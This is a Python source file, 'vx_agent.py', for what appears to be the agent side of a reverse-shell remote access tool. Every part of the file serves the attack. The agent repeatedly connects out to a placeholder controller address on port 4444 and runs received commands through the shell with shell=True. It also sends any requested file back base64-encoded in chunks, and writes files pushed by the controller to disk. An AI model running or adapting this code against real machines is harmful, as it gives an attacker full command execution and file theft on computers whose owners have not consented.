# vx_agent.py
import socket
import subprocess
import os
import base64
import time
from modules import comms, file_transfer

CHUNK_SIZE = 8192

HOST, PORT = 'YOUR_IP_HERE', 4444
s = socket.socket()
print(f"[*] Agent starting up, waiting for listener at {HOST}:{PORT}…")
while True:
    try:
        s.connect((HOST, PORT))
        break
    except ConnectionRefusedError:
        time.sleep(3)
    except Exception as e:
        time.sleep(5)

# ─── Single Handshake ─────────────────────────────────────────────────────
req = comms.rrecv(s)
if not req or req.get("payload") != "[VX_HELLO]":
    s.close()
    exit()
comms.rsend(s, "[VX_AGENT_READY]", dtype="output")

# ─── Main Loop ──────────────────────────────────────────────────────────
while True:
    msg = comms.rrecv(s)
    if not msg:
        break

    cmd = msg.get("payload")
    if not isinstance(cmd, str):
        # unexpected type
        comms.rsend(s, "Invalid command format.", dtype="error")
        continue

    # Exit
    if cmd == "exit":
        break

    # Download
    if cmd.startswith("download "):
        _, file_path = cmd.split(" ", 1)

        if not os.path.isfile(file_path):
            comms.rsend(s, f"File not found: {file_path}", dtype="error")
            continue

        try:
            total_size = os.path.getsize(file_path)
            comms.rsend(s, {
                "filename": os.path.basename(file_path),
                "total_size": total_size
            }, dtype="file_start")

            with open(file_path, "rb") as f:
                while True:
                    chunk = f.read(CHUNK_SIZE)
                    if not chunk:
                        break
                    b64 = base64.b64encode(chunk).decode()
                    comms.rsend(s, {"payload": b64}, dtype="file_chunk")

            comms.rsend(s, {}, dtype="file_end")
            continue

        except Exception as e:
            comms.rsend(s, f"Failed to send file: {e}", dtype="error")
            continue

    
        # Upload (receive file)
    elif cmd.startswith("upload "):
        _, remote_path = cmd.split(" ", 1)
        comms.rsend(s, "[VX_UPLOAD_READY]", dtype="output")  # acknowledge

        resp = comms.rrecv(s)
        if not resp or resp["type"] != "file_start":
            comms.rsend(s, "[!] Expected file_start.", dtype="error")
            continue

        info = resp["payload"]
        filename = info.get("filename", remote_path)
        total_size = info.get("total_size", 0)
        written = 0

        try:
            os.makedirs(os.path.dirname(filename) or ".", exist_ok=True)
            with open(filename, "wb") as f:
                while True:
                    chunk = comms.rrecv(s)
                    if not chunk:
                        break
                    ctype = chunk["type"]
                    if ctype == "file_chunk":
                        payload = chunk["payload"]  # already decoded if comms.rrecv handles it
                        f.write(payload)
                        written += len(payload)
                    elif ctype == "file_end":
                        break
                    elif ctype == "error":
                        break
                    else:
                        break
            comms.rsend(s, f"[+] File received as {filename}", dtype="output")
        except Exception as e:
            comms.rsend(s, f"Failed to write file: {e}", dtype="error")
        continue



    # Change directory
    if cmd.startswith("cd "):
        try:
            os.chdir(cmd.split(" ", 1)[1])
            comms.rsend(s, os.getcwd(), dtype="output")
        except Exception as e:
            comms.rsend(s, str(e), dtype="error")
        continue
    
    # HARD-RESYNC
    elif cmd == "resync":
        # RESET ALL FILE TRANSFER STATE
        globals().update({
            'receiving_file': False,
            'expected_parts': [],
            'current_file': None,
            'file_data': b"",
            'transfer_in_progress': False
        })
        comms.rsend(s, "[VX_SYNC_OK]", dtype="output")
        continue


    # Shell execution
    try:
        out = subprocess.check_output(cmd, shell=True, stderr=subprocess.STDOUT)
        comms.rsend(s, out, dtype="output")
    except subprocess.CalledProcessError:
        comms.rsend(s, f"{cmd} is not a valid shell command.", dtype="error")
    except FileNotFoundError:
        comms.rsend(s, f"{cmd} was not found.", dtype="error")
    except Exception as e:
        comms.rsend(s, f"Unexpected error: {e}", dtype="error")

s.close()
